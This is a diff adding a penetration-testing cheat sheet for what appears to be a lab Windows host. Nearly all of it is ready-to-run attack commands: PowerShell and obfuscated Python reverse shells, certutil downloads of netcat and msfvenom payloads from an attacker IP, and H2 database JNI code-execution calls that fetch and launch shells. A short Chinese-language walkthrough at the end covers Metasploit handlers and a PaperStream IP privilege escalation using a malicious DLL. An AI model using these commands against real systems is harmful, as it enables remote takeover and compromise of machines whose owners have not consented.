@@ -1,0 +1,68 @@
+nmap -sV -sC -Pn 192.168.93.66 > nmap.txt
+
+enum4linux 192.168.93.66  > enum4linun.txt
+
+nmap --script vuln -sV -p 80,135,139,445,8082 -Pn  192.168.93.66  > nmapvuln.txt
+
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.199.66",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+powershell -c IEX(New-Object Net.Webclient).downloadstring('http://192.168.93.66/shell.ps1)'
+$client = New-Object System.Net.Sockets.TCPClient("192.168.199.66",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+certutil.exe -urlcache -split -f http://192.168.199.66/nc.exe nc.exe
+nc.exe -e cmd.exe 3232248157 4444
+certutil.exe -urlcache -split -f http://192.168.199.66/shell.exe shell.exe & shell.exe
+
+certutil -urlcache -split -f http://192.168.199.66/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
+
+C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('192.168.199.66', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.199.66 LPORT=445 -f exe  > shell.exe
+msfvenom -a x64 -p windows/x64/shell/reverse_tcp LHOST=192.168.199.66 LPORT=445 -f exe -o trenchesofit.exe
+
+
+
+IEX(New-Object Net.Webclient).downloadstring('http://192.168.93.66/Invoke-PowerShellTcp.ps1)'
+
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.199.66 -Port 4444
+
+certutil.exe -urlcache -split -f http://192.168.199.66/nc.exe C:\\Users\\tony\\Desktop\\nc.exe
+certutil.exe -urlcache -split -f http://192.168.199.66/UninOldIS.dll UninOldIS.dll
+
+
+
+
+###windows reverse shell
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd /c dir \"C:\\Users\\tony\\Desktop\" ").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("systeminfo ").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.199.66/nc.exe C:\\Users\\tony\\Desktop\\nc.exe").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.199.66/nc64.exe C:\\Users\\tony\\Desktop\\nc64.exe").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.199.66/trenchesofit.exe C:\\Users\\tony\\Desktop\\trenchesofit.exe").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.199.66/shell.exe C:\\Users\\tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd \"C:\\Users\\tony\\Desktop\\nc64.exe 192.168.199.66 445 -e cmd.exe \"").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Desktop\\trenchesofit.exe").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+
+
+1.nmap 找到80及8082端口
+2.發現8082端口是h2 database，帳號sa密碼空可以直接登入
+3.根據h2 database可以找到exploit
+H2 Database 1.4.199 - JNI Code Execution
+3.根據exploit取得RemoteCodeExecution
+4.生成reverse.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.199 LPORT=445 -f exe  > shell.exe
+5.取msf監聽
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+6.上傳shell.exe
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd /c dir \"C:\\Users\\tony\\Desktop\" ").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -f http://192.168.49.199/shell.exe C:\\Users\\tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+7.取得reverse shell後,將程序mirgrate到x64的程序上
+8.發現有PaperStream IP服務
+9.根據PaperStream 找到提權漏洞
+msfvenom  -p windows/meterpreter/reverse_tcp -f dll -o timmy.dll LHOST=192.168.49.199 LPORT=445
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+10.更改49382.ps1內的dll地址
+11.上傳timmy.dll及49382.ps1
